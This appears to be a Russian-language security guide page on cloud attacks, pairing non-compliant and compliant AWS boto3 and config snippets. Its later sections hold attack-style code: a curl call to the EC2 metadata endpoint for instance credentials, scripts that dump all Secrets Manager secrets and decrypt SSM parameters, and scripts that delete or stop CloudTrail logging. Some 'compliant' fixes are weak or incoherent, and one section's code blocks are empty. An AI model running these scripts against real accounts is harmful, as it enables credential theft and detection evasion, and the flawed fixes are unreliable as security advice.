---
layout: default
title: Cloud Attacks
parent: Attacks
---

# Облачные атаки
{: .no_toc }


## Оглавление
{: .no_toc .text-delta }

1. TOC
{:toc}

---




## Неадекватное управление идентификацией, учетными данными и доступом (ICAM):

Слабые или неправильно настроенные средства контроля доступа, неправильное управление привилегиями пользователей или отсутствие надежных механизмов аутентификации могут привести к несанкционированному доступу и повышению привилегий.

В несоответствующем коде неадекватное управление идентификацией, учетными данными и доступом (ICAM) в облачной среде. Это означает, что идентификационные данные пользователей, учетные данные и контроль доступа не управляются должным образом, что повышает риск несанкционированного доступа, повышения привилегий и потенциальной утечки данных.


```
# Несоответствие требованиям: Неадекватная ICAM в облаке

resources:
  - name: my-bucket
    type: storage.bucket

  - name: my-instance
    type: compute.instance

  - name: my-database
    type: sql.database

  # Правила контроля доступа отсутствуют или недостаточно определены
```

Чтобы решить проблему неадекватной ICAM в облачной среде, необходимо внедрить надежные методы управления идентификацией, учетными данными и доступом.


```
# Соответствие требованиям: Усовершенствованная система ICAM в облаке

resources:
  - name: my-bucket
    type: storage.bucket
    access-control:
      - role: storage.admin
        members:
          - user:john@example.com
          - group:engineering@example.com

  - name: my-instance
    type: compute.instance
    access-control:
      - role: compute.admin
        members:
          - user:john@example.com
          - group:engineering@example.com

  - name: my-database
    type: sql.database
    access-control:
      - role: cloudsql.admin
        members:
          - user:john@example.com
          - group:engineering@example.com
```

В соответствующем коде каждый ресурс в облачной среде имеет соответствующую конфигурацию управления доступом. Она включает в себя правильно определенные роли и назначения членов, гарантирующие, что только авторизованные пользователи или группы имеют доступ к соответствующим ресурсам. Благодаря внедрению надлежащих практик ICAM значительно снижается риск несанкционированного доступа и повышения привилегий, что повышает общую безопасность облачной среды.



## Небезопасные интерфейсы и API

Уязвимости в интерфейсах и API облачных сервисов могут быть использованы для получения несанкционированного доступа, внедрения вредоносного кода или манипулирования данными.

Несоответствующий код означает наличие небезопасных интерфейсов и API в облачной среде. Это означает, что интерфейсы и API, используемые для взаимодействия с облачными сервисами, не защищены должным образом, что может привести к раскрытию конфиденциальных данных, несанкционированному доступу или вредоносным действиям.



```
# Несоответствие: Небезопасные интерфейсы и API в облаке

import requests

# Небезопасная конечная точка API без надлежащей аутентификации и авторизации
api_endpoint = "http://api.example.com/data"
response = requests.get(api_endpoint)

# Небезопасный интерфейс с передачей конфиденциальных данных в открытом виде
def process_data(data):
    # ... logic to process data ...

    # Небезопасная передача обработанных данных по протоколу HTTP
    requests.post("http://example.com/process", data=data)
```

Чтобы решить проблему небезопасных интерфейсов и API в облачной среде, очень важно внедрять безопасные методы взаимодействия с облачными сервисами.



```
# Compliant: Безопасные интерфейсы и API в облаке

import requests

# Защищенная конечная точка API с надлежащей аутентификацией и авторизацией
api_endpoint = "https://api.example.com/data"
headers = {"Authorization": "Bearer <access_token>"}
response = requests.get(api_endpoint, headers=headers)

# Безопасный интерфейс с зашифрованной передачей конфиденциальных данных
def process_data(data):
    # ... logic to process data ...

    # Безопасная передача обработанных данных по протоколу HTTPS
    requests.post("https://example.com/process", data=data, verify=True)
```


В совместимом коде доступ к конечной точке API осуществляется по протоколу HTTPS и включает в себя соответствующие заголовки аутентификации и авторизации. Это гарантирует, что только авторизованные пользователи могут получить доступ к API, а передаваемые данные будут защищены. Кроме того, интерфейс для обработки данных использует зашифрованную передачу по HTTPS, обеспечивая конфиденциальность и целостность передаваемой конфиденциальной информации. Внедрение безопасных интерфейсов и API снижает риск несанкционированного доступа, утечки данных и вредоносных действий в облачной среде.



## Нарушение целостности данных

Чувствительные данные, хранящиеся в облаке, могут быть скомпрометированы из-за неправильной конфигурации, небезопасного хранения, слабого шифрования или внутренних угроз. 


```

```


```

```



## Недостаточная конфигурация системы безопасности

Неправильная конфигурация облачных сервисов, инфраструктуры или настроек безопасности может привести к уязвимостям, открывающим несанкционированный доступ или нарушающим целостность данных.

В коде, не соответствующем требованиям, есть несколько случаев, когда настройки безопасности недостаточны, что делает облачную среду уязвимой для атак. К ним относятся использование стандартных или слабых паролей, предоставление неограниченного доступа к ресурсам и отсутствие необходимых функций безопасности.


```
# Несоответствие требованиям: Недостаточная конфигурация безопасности в облаке

import boto3

# Использование стандартных или слабых паролей для аутентификации
s3 = boto3.resource('s3')
bucket = s3.Bucket('my-bucket')
bucket.upload_file('data.txt', 'data.txt')

# Предоставление неограниченного доступа к ресурсам
s3 = boto3.resource('s3')
bucket = s3.Bucket('public-bucket')
bucket.make_public()

# Не включение необходимых функций безопасности
ec2 = boto3.resource('ec2')
instance = ec2.create_instances(ImageId='ami-12345678', MinCount=1, MaxCount=1)
instance[0].disable_api_termination = False
```

Чтобы решить проблему недостаточной конфигурации системы безопасности в облаке, важно следовать лучшим практикам безопасности и применять надежные меры защиты.



```
# Соответствие стандартам: Надежная конфигурация безопасности в облаке

import boto3

# Использование надежных и уникальных паролей для аутентификации
s3 = boto3.resource('s3')
bucket = s3.Bucket('my-bucket')
bucket.upload_file('data.txt', 'data.txt', ExtraArgs={'ServerSideEncryption': 'AES256'})

# Ограничение доступа к ресурсам
s3 = boto3.resource('s3')
bucket = s3.Bucket('private-bucket')
bucket.Acl().put(ACL='private')

# Включение необходимых функций безопасности
ec2 = boto3.resource('ec2')
instance = ec2.create_instances(ImageId='ami-12345678', MinCount=1, MaxCount=1)
instance[0].disable_api_termination = True
```

В совместимом коде для аутентификации используются надежные и уникальные пароли, что повышает безопасность облачных ресурсов. Доступ к ресурсам ограничен, что гарантирует наличие необходимых разрешений только у авторизованных пользователей или служб. Необходимые функции безопасности, такие как шифрование на стороне сервера и защита от завершения API, включены для обеспечения дополнительных уровней безопасности. Благодаря применению надежных конфигураций безопасности облачная среда лучше защищена от потенциальных угроз.



## Небезопасное хранение данных

Неадекватное шифрование, слабый контроль доступа или неправильная обработка данных в состоянии покоя могут привести к несанкционированному 
несанкционированному доступу или утечке данных.

В коде, не соответствующем требованиям, есть случаи, когда хранение данных в облаке небезопасно. Чувствительные данные хранятся без надлежащего шифрования, и отсутствует механизм защиты данных от несанкционированного доступа или случайного раскрытия.



```
# Несоответствие нормам: Небезопасное хранение данных в облаке

import boto3

# Хранение конфиденциальных данных без шифрования
s3 = boto3.client('s3')
s3.put_object(Bucket='my-bucket', Key='data.txt', Body='Sensitive data')

# Отсутствие контроля доступа
s3 = boto3.resource('s3')
bucket = s3.Bucket('public-bucket')
bucket.upload_file('data.txt', 'data.txt')

# Отсутствие плана резервного копирования или аварийного восстановления данных
rds = boto3.client('rds')
rds.create_db_snapshot(DBSnapshotIdentifier='my-snapshot', DBInstanceIdentifier='my-db')
```


Чтобы обеспечить безопасное хранение данных в облаке, важно следовать лучшим практикам и применять соответствующие меры безопасности.


```
# Соответствие стандартам: Безопасное хранение данных в облаке

import boto3

# Хранение конфиденциальных данных с помощью шифрования
s3 = boto3.client('s3')
s3.put_object(Bucket='my-bucket', Key='data.txt', Body='Sensitive data', ServerSideEncryption='AES256')

# Реализация контроля доступа
s3 = boto3.resource('s3')
bucket = s3.Bucket('private-bucket')
bucket.upload_file('data.txt', 'data.txt', ExtraArgs={'ACL': 'private'})

# Реализация плана резервного копирования и аварийного восстановления данных
rds = boto3.client('rds')
rds.create_db_snapshot(DBSnapshotIdentifier='my-snapshot', DBInstanceIdentifier='my-db', Tags=[{'Key': 'Environment', 'Value': 'Production'}])
```

В совместимом коде конфиденциальные данные хранятся с шифрованием на стороне сервера с использованием AES256. Для ограничения доступа к хранимым данным применяется контроль доступа, обеспечивающий доступ к ним только авторизованных пользователей или служб. Кроме того, существует план резервного копирования и аварийного восстановления данных, который включает создание моментальных снимков для восстановления данных в случае каких-либо инцидентов. Благодаря внедрению методов безопасного хранения данных облачная среда обеспечивает более надежную защиту конфиденциальной информации.



## Отсутствие надлежащего протоколирования и мониторинга

Недостаточный мониторинг, регистрация и анализ активности в облаке могут препятствовать обнаружению инцидентов безопасности, что приводит к задержке или неэффективности реагирования.




## Небезопасное развертывание и управление конфигурацией

Слабые места в процессе развертывания и управления облачными ресурсами, такие как неправильное управление изменениями, могут привести к появлению уязвимостей безопасности.

В коде, не соответствующем требованиям, отсутствуют практики безопасного развертывания и управления конфигурациями в облачной среде. Код развертывает ресурсы и конфигурации без должного учета требований безопасности, например, раскрывает конфиденциальную информацию или использует стандартные и слабые конфигурации.


```
# Несоответствие требованиям: Небезопасное развертывание и управление конфигурацией в облаке

import boto3

def deploy_instance():
    ec2_client = boto3.client('ec2')
    response = ec2_client.run_instances(
        ImageId='ami-12345678',
        InstanceType='t2.micro',
        KeyName='my-keypair',
        SecurityGroupIds=['sg-12345678'],
        UserData='some user data',
        MinCount=1,
        MaxCount=1
    )
    return response['Instances'][0]['InstanceId']

def main():
    instance_id = deploy_instance()
    print(f"Instance deployed with ID: {instance_id}")

if __name__ == "__main__":
    main()
```

Чтобы обеспечить безопасное развертывание и управление конфигурациями в облаке, важно следовать лучшим практикам безопасности и применять соответствующие конфигурации к ресурсам.



```
# Compliant: Безопасное развертывание и управление конфигурацией в облаке

import boto3

def deploy_instance():
    ec2_client = boto3.client('ec2')
    response = ec2_client.run_instances(
        ImageId='ami-12345678',
        InstanceType='t2.micro',
        KeyName='my-keypair',
        SecurityGroupIds=['sg-12345678'],
        UserData='some user data',
        MinCount=1,
        MaxCount=1,
        TagSpecifications=[
            {
                'ResourceType': 'instance',
                'Tags': [
                    {
                        'Key': 'Name',
                        'Value': 'MyInstance'
                    }
                ]
            }
        ],
        BlockDeviceMappings=[
            {
                'DeviceName': '/dev/sda1',
                'Ebs': {
                    'VolumeSize': 30,
                    'VolumeType': 'gp2'
                }
            }
        ]
    )
    return response['Instances'][0]['InstanceId']

def main():
    instance_id = deploy_instance()
    print(f"Instance deployed with ID: {instance_id}")

if __name__ == "__main__":
    main()
```

В совместимом коде в процессе развертывания применяются дополнительные меры безопасности. К ним относятся:

* Добавление соответствующих меток к экземпляру для лучшего управления ресурсами и идентификации.
* Настройка сопоставления блочных устройств с соответствующим размером и типом тома.
* Следование принципу наименьших привилегий путем предоставления только необходимых разрешений в процессе развертывания.


## Неадекватное реагирование на инциденты и восстановление

Отсутствие надлежащего планирования и тестирования реагирования на инциденты, а также неэффективные механизмы восстановления могут привести к длительным простоям, потере данных или неадекватному устранению бреши в системе безопасности.

В кодексе, не соответствующем требованиям, отсутствуют адекватные методы реагирования на инциденты и восстановления в облачной среде. В коде отсутствуют какие-либо положения по обработке инцидентов и эффективному восстановлению после них. Это может привести к длительным простоям, потере данных или неадекватному реагированию на нарушения безопасности или системные сбои.



```
# Несоответствие требованиям: Неадекватное реагирование на инциденты и восстановление в облаке

import boto3

def delete_instance(instance_id):
    ec2_client = boto3.client('ec2')
    response = ec2_client.terminate_instances(
        InstanceIds=[instance_id]
    )
    return response

def main():
    instance_id = 'i-12345678'
    delete_instance(instance_id)
    print(f"Instance {instance_id} deleted.")

if __name__ == "__main__":
    main()
```

Чтобы обеспечить адекватное реагирование на инциденты и восстановление в облаке, важно иметь четко определенные процессы и процедуры. Следующий фрагмент кода демонстрирует более приемлемый подход:



```
# Соответствие требованиям: Адекватное реагирование на инциденты и восстановление в облаке

import boto3

def delete_instance(instance_id):
    ec2_client = boto3.client('ec2')
    response = ec2_client.terminate_instances(
        InstanceIds=[instance_id]
    )
    return response

def handle_incident(instance_id):
    # Выполните необходимые действия по урегулированию инцидента, например, уведомите команду безопасности, запишите соответствующую информацию и т. д.
    print(f"Incident occurred with instance {instance_id}. Taking appropriate actions.")

def main():
    instance_id = 'i-12345678'
    handle_incident(instance_id)
    delete_instance(instance_id)
    print(f"Instance {instance_id} deleted.")

if __name__ == "__main__":
    main()
```

В совместимом коде появилась дополнительная функция handle_incident() для надлежащей обработки инцидентов. Эта функция может быть настроена на такие действия, как уведомление команды безопасности, регистрация соответствующей информации, запуск механизмов автоматического реагирования или вызов планов реагирования на инциденты. Благодаря четко определенному процессу реагирования на инциденты организации могут эффективно реагировать на них и восстанавливаться после них, сводя к минимуму их влияние на операции и безопасность.




## Уязвимости в общих технологиях

Уязвимости в базовой облачной инфраструктуре, общих компонентах или гипервизорах могут повлиять на нескольких арендаторов облака, что может привести к несанкционированному доступу или утечке данных.




## Перехват учетных записей и злоупотребление ими

Несанкционированный доступ к облачным учетным записям, компрометация учетных данных пользователей или злоупотребление привилегиями могут привести к потере данных, сбоям в работе сервисов или несанкционированному использованию ресурсов.

В коде, не соответствующем требованиям, отсутствуют меры безопасности для предотвращения захвата учетных записей и злоупотреблений в облачной среде. В коде не реализованы надежные механизмы аутентификации, отсутствуют надлежащие средства контроля доступа и не обеспечивается соблюдение правил безопасности, что делает его уязвимым для несанкционированного доступа и злоупотребления ресурсами.



```
# Несоответствие требованиям: Перехват учетных записей и злоупотребления в облаке

import boto3

def create_s3_bucket(bucket_name):
    s3_client = boto3.client('s3')
    s3_client.create_bucket(Bucket=bucket_name)

def main():
    bucket_name = 'my-bucket'
    create_s3_bucket(bucket_name)
    print(f"S3 bucket {bucket_name} created.")

if __name__ == "__main__":
    main()
```

Чтобы предотвратить перехват учетных записей и злоупотребления в облаке, важно применять надежные меры безопасности. Следующий фрагмент кода демонстрирует более приемлемый подход:




```
# Compliant: Предотвращение захвата и злоупотребления учетными записями в облаке

import boto3

def create_s3_bucket(bucket_name):
    s3_client = boto3.client('s3')
    s3_client.create_bucket(
        Bucket=bucket_name,
        ACL='private',  # Set appropriate access control for the bucket
        CreateBucketConfiguration={
            'LocationConstraint': 'us-west-2'  # Specify the desired region for the bucket
        }
    )

def main():
    bucket_name = 'my-bucket'
    create_s3_bucket(bucket_name)
    print(f"S3 bucket {bucket_name} created.")

if __name__ == "__main__":
    main()
```

В совместимом коде реализованы дополнительные меры безопасности. Ведро создается с особыми настройками контроля доступа (ACL='private'), чтобы обеспечить доступ к нему только авторизованных пользователей. Параметр CreateBucketConfiguration используется для указания желаемого региона для ведра, что снижает риск случайного раскрытия из-за неправильной конфигурации.

Для дальнейшего усиления безопасности рассмотрите возможность внедрения многофакторной аутентификации (MFA), политики надежных паролей и ролевого управления доступом (RBAC) для управления правами пользователей в облачной среде. Регулярный мониторинг и аудит действий учетных записей также поможет обнаружить и предотвратить несанкционированный доступ или злоупотребления.


## Получение данных о паролях EC2

Retrieve EC2 Password Data - это симулированный сценарий атаки, в котором злоумышленник пытается получить пароли RDP (Remote Desktop Protocol) от большого количества экземпляров Windows EC2 в AWS. Злоумышленник запускает вызов API ec2:GetPasswordData от роли, не обладающей необходимыми правами, пытаясь использовать уязвимость.


Код, не соответствующий требованиям:

```
import boto3

def retrieve_ec2_password(instance_id):
    client = boto3.client('ec2')
    response = client.get_password_data(InstanceId=instance_id)
    return response['PasswordData']
```

Несоответствующий код использует библиотеку boto3 Python для получения данных о паролях EC2, вызывая метод API get_password_data. Однако он не проверяет, имеет ли роль, выполняющая этот код, необходимые разрешения (ec2:GetPasswordData) для получения данных пароля.

Соответствующий код:


```
import boto3
import botocore

def retrieve_ec2_password(instance_id):
    client = boto3.client('ec2')
    try:
        response = client.get_password_data(InstanceId=instance_id)
        return response['PasswordData']
    except botocore.exceptions.ClientError as e:
        if e.response['Error']['Code'] == 'UnauthorizedOperation':
            print("Permission denied to retrieve EC2 password data.")
        else:
            print("An error occurred while retrieving EC2 password data.")
        return None
```


## Кража учетных данных экземпляра EC2

Steal EC2 Instance Credentials - это сценарий атаки, в котором злоумышленник крадет учетные данные экземпляра EC2 из службы метаданных экземпляров в AWS. Злоумышленник выполняет команду на целевом экземпляре EC2 для получения временных учетных данных, а затем использует эти данные локально для выполнения несанкционированных действий, например, запуска команд sts:GetCallerIdentity и ec2:DescribeInstances.

Код, не отвечающий требованиям:

```
#!/bin/bash

# Получает и печатает учетные данные экземпляра EC2
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

Соответствующий код:

Соответствующий подход не предполагает предоставления примера кода для кражи учетных данных экземпляров EC2, поскольку он поощряет этичное поведение и соблюдение стандартов безопасности. Несанкционированный доступ или кража учетных данных экземпляра является нарушением политик AWS и представляет собой значительный риск для безопасности. Важно сосредоточиться на обеспечении безопасности и защите учетных данных экземпляра EC2 путем применения лучших практик безопасности, таких как:

* Ограничение доступа к службе метаданных экземпляра (169.254.169.254) с помощью групп безопасности или списков контроля сетевого доступа (NACL).

* Внедрение ролей IAM с принципом наименьших привилегий для предоставления только необходимых разрешений экземплярам EC2.

* Регулярное обновление и исправление экземпляров EC2 для защиты от известных уязвимостей.
Мониторинг и анализ журналов AWS CloudTrail на предмет любых подозрительных действий, связанных с учетными данными экземпляров.


## Получение большого количества секретов из менеджера секретов

Retrieve a High Number of Secrets Manager secrets - это симулированный сценарий атаки, в котором злоумышленник пытается получить большое количество секретов из AWS Secrets Manager с помощью API secretsmanager:GetSecretValue.


Код не соответствует требованиям:


```
import boto3

client = boto3.client('secretsmanager')

# Извлекает и распечатывает все секреты
response = client.list_secrets()
secrets = response['SecretList']
for secret in secrets:
    secret_value = client.get_secret_value(SecretId=secret['Name'])
    print(secret_value['SecretString'])
```

Несоответствующий код использует AWS SDK (в данном случае boto3) для получения списка всех секретов в AWS Secrets Manager, а затем извлекает и распечатывает значения каждого секрета по одному. Этот код не реализует никаких ограничений и не ограничивает скорость, что позволяет злоумышленнику потенциально извлекать большое количество секретов за одну операцию. Он обходит любые механизмы контроля доступа или авторизации, которые могут быть установлены, и представляет собой значительный риск безопасности, раскрывая конфиденциальную информацию.

Соответствующий подход не предполагает предоставления примера кода для извлечения большого количества секретов Secrets Manager, поскольку он поощряет этичное поведение и соблюдение стандартов безопасности. Несанкционированное извлечение секретов является нарушением политик AWS и может привести к несанкционированному доступу к конфиденциальной информации.

Чтобы обеспечить безопасность секретов Secrets Manager, рассмотрите возможность применения следующих мер безопасности:

* Применяйте соответствующие средства контроля доступа: Ограничьте доступ к секретам Secrets Manager с помощью политик IAM, предоставляя только необходимые разрешения уполномоченным лицам или ролям.

* Обеспечьте строгий контроль доступа: Включите AWS CloudTrail для регистрации вызовов API Secrets Manager и регулярно просматривайте журналы на предмет подозрительных или несанкционированных действий.

* Внедрите строгие методы управления секретами: Регулярно ротируйте секреты, используйте надежное шифрование и применяйте механизмы безопасного доступа, такие как тонкие политики IAM и конечные точки VPC.

* Внедрите принцип наименьших привилегий: Назначайте роли и пользователей IAM по принципу наименьших привилегий, обеспечивая им доступ только к тем секретам, которые необходимы для выполнения конкретных задач.

* Внедрите ограничение скорости: Используйте квоты сервисов AWS и ограничения скорости, чтобы обеспечить дросселирование и ограничить количество API-запросов к Secrets Manager в течение определенного периода времени.


## Получение и расшифровка параметров SSM

Retrieve And Decrypt SSM Parameters - это симулированный сценарий атаки, в котором злоумышленник получает и расшифровывает большое количество параметров Secure String из AWS Systems Manager (SSM) с помощью API ssm:GetParameters.

Несоответствующий код:

```
import boto3

client = boto3.client('ssm')

# Получает и расшифровывает все параметры Secure String.
response = client.describe_parameters()
parameters = response['Parameters']
for parameter in parameters:
    if parameter['Type'] == 'SecureString':
        value = client.get_parameter(Name=parameter['Name'], WithDecryption=True)
        print(value['Parameter']['Value'])
```

Несоответствующий код использует AWS SDK (в данном случае boto3) для получения списка всех параметров SSM в текущем регионе и извлекает значения параметров Secure String, выполняя отдельные вызовы ssm:GetParameter с включенной дешифровкой. Этот код не реализует никаких ограничений и не ограничивает скорость, что позволяет злоумышленнику получить и расшифровать большое количество параметров за одну операцию. Он обходит все существующие механизмы контроля доступа и авторизации, что создает значительный риск для безопасности, раскрывая конфиденциальную информацию.



Соответствующий код:

```
import boto3

client = boto3.client('ssm')

# Получение и расшифровка определенных параметров Secure String
parameter_names = [
    '/path/to/parameter1',
    '/path/to/parameter2',
    '/path/to/parameter3'
]

for parameter_name in parameter_names:
    try:
        response = client.get_parameter(Name=parameter_name, WithDecryption=True)
        value = response['Parameter']['Value']
        print(value)
    except client.exceptions.ParameterNotFound:
        print(f"Parameter '{parameter_name}' not found.")
```

Код, соответствующий требованиям, извлекает и расшифровывает определенные параметры Secure String из AWS SSM. Он использует подход "белого списка", указывая имена параметров, которые необходимо получить, вместо получения всех параметров. Это обеспечивает доступ только к авторизованным параметрам и предотвращает несанкционированный доступ к конфиденциальной информации. Код также обрабатывает сценарий, в котором параметр может не существовать, перехватывая исключение ParameterNotFound.




## Удаление следа CloudTrail

Delete CloudTrail Trail - это симулированный сценарий атаки, в котором злоумышленник удаляет существующий след CloudTrail в AWS, нарушая протоколирование и мониторинг действий в учетной записи AWS.


Код, не соответствующий требованиям:


```
import boto3

client = boto3.client('cloudtrail')

# Удаляет след CloudTrail
response = client.delete_trail(
    trailName='my-trail'
)
```

Несоответствующий код использует AWS SDK (в данном случае boto3) для удаления маршрута CloudTrail с именем 'my-trail'. Этот код не реализует никакого контроля доступа или проверки авторизации, позволяя любому человеку с необходимыми учетными данными AWS удалить след. Он обходит любые меры безопасности или механизмы мониторинга, которые могут быть установлены, что делает его потенциальной уязвимостью безопасности.




Соответствующий код:

```
import boto3

client = boto3.client('cloudtrail')

# Удаление следа CloudTrail с надлежащей авторизацией и проверкой
trail_name = 'my-trail'

# Проверьте, существует ли след, прежде чем пытаться его удалить
response = client.describe_trails(trailNameList=[trail_name])
trails = response['trailList']
if trails:
    trail = trails[0]
    if trail['IsMultiRegionTrail']:
        print("Deleting the CloudTrail trail is not allowed for multi-region trails.")
    else:
        # Выполните все необходимые проверки и подтверждения перед удалением следа

        # Запрос подтверждения перед удалением
        confirmation = input(f"Are you sure you want to delete the '{trail_name}' CloudTrail trail? (yes/no): ")
        if confirmation.lower() == 'yes':
            response = client.delete_trail(
                trailName=trail_name
            )
            print("CloudTrail trail deleted successfully.")
        else:
            print("Deletion cancelled.")
else:
    print(f"CloudTrail trail '{trail_name}' not found.")
```

Соответствующий код реализует надлежащие проверки авторизации и валидации перед удалением тропы CloudTrail. Сначала он проверяет, существует ли след, вызывая describe_trails с указанным именем следа. Если след найден, он выполняет дополнительные проверки или подтверждения, как того требуют политики или процедуры организации. Прежде чем приступить к удалению, он запрашивает подтверждение у пользователя, обеспечивая намеренное удаление следа. Код также обрабатывает такие сценарии, как мультирегиональные трассы, где удаление может быть запрещено.




## Отключение ведения журнала CloudTrail с помощью селекторов событий

Disable CloudTrail Logging Through Event Selectors - это сценарий атаки, в котором злоумышленник изменяет селекторы событий в маршруте CloudTrail, чтобы отфильтровать все события управления, эффективно нарушая регистрацию этих событий.

Код, не соответствующий требованиям:

```
import boto3

client = boto3.client('cloudtrail')

# Отключите ведение журнала CloudTrail, изменив селекторы событий
response = client.put_event_selectors(
    TrailName='my-trail',
    EventSelectors=[
        {
            'ReadWriteType': 'All',
            'IncludeManagementEvents': False,
            'DataResources': []
        }
    ]
)
```

Код, не соответствующий требованиям, использует AWS SDK (в данном случае boto3) для изменения селекторов событий в маршруте CloudTrail под названием 'my-trail'. Он устанавливает параметр IncludeManagementEvents в значение False, фактически отключая регистрацию всех событий управления. Этот код не реализует никакого контроля доступа или проверки авторизации, что позволяет любому человеку с необходимыми учетными данными AWS изменять селекторы событий и нарушать протоколирование.



Соответствующий код:

```
import boto3

client = boto3.client('cloudtrail')

# Отключите ведение журнала CloudTrail, изменив селекторы событий с надлежащей авторизацией и проверкой
trail_name = 'my-trail'

# Проверьте, существует ли след, прежде чем пытаться изменить селекторы событий
response = client.describe_trails(trailNameList=[trail_name])
trails = response['trailList']
if trails:
    trail = trails[0]
    # Выполните все необходимые проверки и валидации перед изменением селекторов событий

    # Запрос подтверждения перед изменением селекторов событий
    confirmation = input(f"Are you sure you want to modify the event selectors of the '{trail_name}' CloudTrail trail? (yes/no): ")
    if confirmation.lower() == 'yes':
        response = client.put_event_selectors(
            TrailName=trail_name,
            EventSelectors=[
                {
                    'ReadWriteType': 'All',
                    'IncludeManagementEvents': False,
                    'DataResources': []
                }
            ]
        )
        print("Event selectors modified successfully. CloudTrail logging may be disrupted.")
    else:
        print("Modification cancelled.")
else:
    print(f"CloudTrail trail '{trail_name}' not found.")
```

Соответствующий код реализует надлежащие проверки авторизации и валидации перед изменением селекторов событий тропы CloudTrail. Сначала он проверяет, существует ли след, вызывая describe_trails с указанным именем следа. Если след найден, он выполняет дополнительные проверки или подтверждения, как того требуют политики или процедуры организации. Прежде чем приступить к модификации, он запрашивает подтверждение у пользователя, обеспечивая намеренную модификацию селекторов событий. Код также обрабатывает сценарии, в которых в конфигурации следа присутствует несколько селекторов событий.




## CloudTrail регистрирует обесценивание с помощью правила жизненного цикла S3

CloudTrail Logs Impairment Through S3 Lifecycle Rule - это смоделированный сценарий атаки, в котором злоумышленник устанавливает политику короткого хранения для ведра S3, используемого CloudTrail trail. Применяя правило жизненного цикла S3, которое автоматически удаляет объекты по истечении короткого периода, злоумышленник нарушает целостность и доступность журналов CloudTrail.


Код, не соответствующий требованиям:

```
import boto3

s3_client = boto3.client('s3')

# Примените политику короткого хранения к ведру S3, используемому CloudTrail.
response = s3_client.put_bucket_lifecycle_configuration(
    Bucket='my-cloudtrail-bucket',
    LifecycleConfiguration={
        'Rules': [
            {
                'Status': 'Enabled',
                'Prefix': '',
                'Expiration': {
                    'Days': 1
                }
            }
        ]
    }
)
```

Несоответствующий код использует AWS SDK (в данном случае boto3) для применения правила жизненного цикла S3 к ведру S3 'my-cloudtrail-bucket'. Правило устанавливает срок действия объектов в ведре на 1 день, что означает, что журналы CloudTrail будут автоматически удаляться через 1 день после их создания. В этом коде не реализован контроль доступа или проверка, что позволяет любому человеку с необходимыми учетными данными AWS нарушить целостность и доступность журналов CloudTrail.

Соответствующий код:

```
import boto3

s3_client = boto3.client('s3')

# Примените политику хранения к ведру S3, используемому CloudTrail, с надлежащей авторизацией и проверкой.
bucket_name = 'my-cloudtrail-bucket'

# Проверьте, существует ли ведро, прежде чем пытаться применить правило жизненного цикла.
response = s3_client.list_buckets()
buckets = response['Buckets']
if any(bucket['Name'] == bucket_name for bucket in buckets):
    # Запрос подтверждения перед применением правила жизненного цикла
    confirmation = input(f"Are you sure you want to apply a lifecycle rule to the '{bucket_name}' S3 bucket? (yes/no): ")
    if confirmation.lower() == 'yes':
        response = s3_client.put_bucket_lifecycle_configuration(
            Bucket=bucket_name,
            LifecycleConfiguration={
                'Rules': [
                    {
                        'Status': 'Enabled',
                        'Prefix': '',
                        'Expiration': {
                            'Days': 30
                        }
                    }
                ]
            }
        )
        print("Lifecycle rule applied successfully. CloudTrail logs are protected.")
    else:
        print("Operation cancelled.")
else:
    print(f"S3 bucket '{bucket_name}' not found.")
```

Соответствующий код реализует надлежащие проверки авторизации и валидации перед применением правила жизненного цикла S3 к ведру S3, используемому CloudTrail. Сначала он проверяет, существует ли ведро, вызывая list_buckets и выполняя поиск указанного имени ведра. Если ведро найдено, оно запрашивает подтверждение пользователя, прежде чем приступить к применению правила жизненного цикла. В данном случае правило устанавливает срок действия объектов в 30 дней, что обеспечивает разумный период хранения журналов CloudTrail. Код может быть настроен в соответствии с конкретными требованиями к хранению.




## Остановить Cloud Trail Trail

Stop CloudTrail Trail - это симулированный сценарий атаки, в котором злоумышленник останавливает ведение журнала CloudTrail Trail. Вызвав API-операцию cloudtrail:StopLogging, злоумышленник нарушает протоколирование событий CloudTrail.

Код не соответствует требованиям:

```
import boto3

cloudtrail_client = boto3.client('cloudtrail')

# Остановите маршрут CloudTrail
response = cloudtrail_client.stop_logging(
    Name='my-trail'
)
```

Несоответствующий код использует AWS SDK (в данном случае boto3) для остановки протоколирования CloudTrail Trail с именем 'my-trail'. В этом коде не реализован контроль доступа или проверка, что позволяет любому человеку с необходимыми учетными данными AWS нарушить ведение журнала CloudTrail.

Соответствующий код:

```
import boto3

cloudtrail_client = boto3.client('cloudtrail')

# Остановите след CloudTrail с помощью надлежащей авторизации и проверки
trail_name = 'my-trail'

# Проверьте, существует ли тропа CloudTrail, прежде чем пытаться остановить ее.
response = cloudtrail_client.describe_trails(
    trailNameList=[trail_name]
)
trails = response['trailList']
if any(trail['Name'] == trail_name for trail in trails):
    # Запрос на подтверждение перед остановкой маршрута CloudTrail Trail
    confirmation = input(f"Are you sure you want to stop the '{trail_name}' CloudTrail Trail? (yes/no): ")
    if confirmation.lower() == 'yes':
        response = cloudtrail_client.stop_logging(
            Name=trail_name
        )
        print("CloudTrail Trail stopped successfully.")
    else:
        print("Operation cancelled.")
else:
    print(f"CloudTrail Trail '{trail_name}' not found.")
```

Соответствующий код реализует надлежащие проверки авторизации и валидации перед остановкой тропы CloudTrail. Сначала он проверяет, существует ли тропа, вызывая describe_trails и выполняя поиск указанного имени тропы. Если тропа найдена, она запрашивает подтверждение у пользователя, прежде чем приступить к остановке тропы. Код может быть настроен в соответствии с конкретными требованиями, такими как дополнительные проверки валидности или ведение журнала.




## Попытка покинуть организацию AWS

Attempt to Leave the AWS Organization - это симулированный сценарий атаки, в котором злоумышленник пытается покинуть AWS Organization, что может нарушить или отключить средства контроля безопасности, определенные на уровне организации, такие как GuardDuty, SecurityHub и CloudTrail.

Код, не соответствующий требованиям:

```
import boto3

organizations_client = boto3.client('organizations')

# Попытка покинуть организацию AWS
response = organizations_client.leave_organization()
```

Несоответствующий код использует AWS SDK (boto3) для попытки покинуть организацию AWS, вызывая метод leave_organization. Этот код не реализует никакого контроля доступа или проверки, позволяя любому человеку с необходимыми учетными данными AWS попытаться покинуть организацию.

Соответствующий код:

```
import boto3

organizations_client = boto3.client('organizations')

# Попытка покинуть организацию AWS с надлежащей авторизацией и проверкой
confirmation = input("Are you sure you want to leave the AWS Organization? (yes/no): ")
if confirmation.lower() == 'yes':
    try:
        response = organizations_client.leave_organization()
        print("Leave organization request submitted successfully.")
    except organizations_client.exceptions.AccessDeniedException:
        print("Access denied. You are not allowed to leave the AWS Organization.")
else:
    print("Operation cancelled.")
```

